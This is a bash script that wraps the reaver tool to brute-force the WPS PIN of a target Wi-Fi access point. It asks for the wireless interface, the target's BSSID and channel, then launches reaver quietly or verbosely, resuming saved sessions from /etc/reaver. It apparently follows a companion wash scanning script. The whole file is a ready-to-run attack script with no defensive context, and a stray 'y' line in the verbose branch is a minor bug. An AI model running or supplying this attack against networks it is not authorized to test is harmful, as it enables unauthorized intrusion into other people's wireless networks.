#! /bin/bash


#######################################
#
#This script is used in conjuction with
#4_wash_wps_detector.sh this should be
#run after that script and after you
#have collected the bssid, essid and
#channel of the target network with
#wash
#
#######################################


###COLLECT INFO FROM USER


echo "Please enter the interface you wish to use:"
read WIFIINTERFACE
echo -e "\n"

echo "Now enter the bssid (AP mac) of target:"
read APBSSID
echo -e "\n"

echo "Enter the channel:"
read APCHANNEL
echo -e "\n"

echo "Would you like to run reaver (Q)uietly or (V)erbose?"
read VERBOSEORNOT
echo -e "\n"

echo "Is this a continuation of a previous reaver attack?"
read CONTINUATION
echo -e "\n"


case $VERBOSEORNOT in

###check for verbosity quiet
[Qq] )  ###then check continuation or not
	if [ "$CONTINUATION" = "Y" ] || [ "$CONTINUATION" = "y" ]; then
	reaver -i $WIFIINTERFACE -b $APBSSID -c $APCHANNEL -d 0 -q -s /etc/reaver/$APBSSID

	### to answer the question of continue or not
	
	else
	reaver -i $WIFIINTERFACE -b $APBSSID -c $APCHANNEL -d 0 -q
	###no continue

	fi ###end of if
;;

###check for verbosity yes
[Vv] ) ###then check if continuation or not
	if [ "$CONTINUATION" = "Y" ] || [ "$CONTINUATION" = "y" ]; then
	reaver -i $WIFIINTERFACE -b $APBSSID -c $APCHANNEL -d 0 -vv -s /etc/reaver/$APBSSID
	y
	### yes to continue with crack
	
	else
	reaver -i $WIFIINTERFACE -b $APBSSID -c $APCHANNEL -d 0 -vv
	### nothing, it wont ask if its not a continue

	fi ### end of if

;;


esac












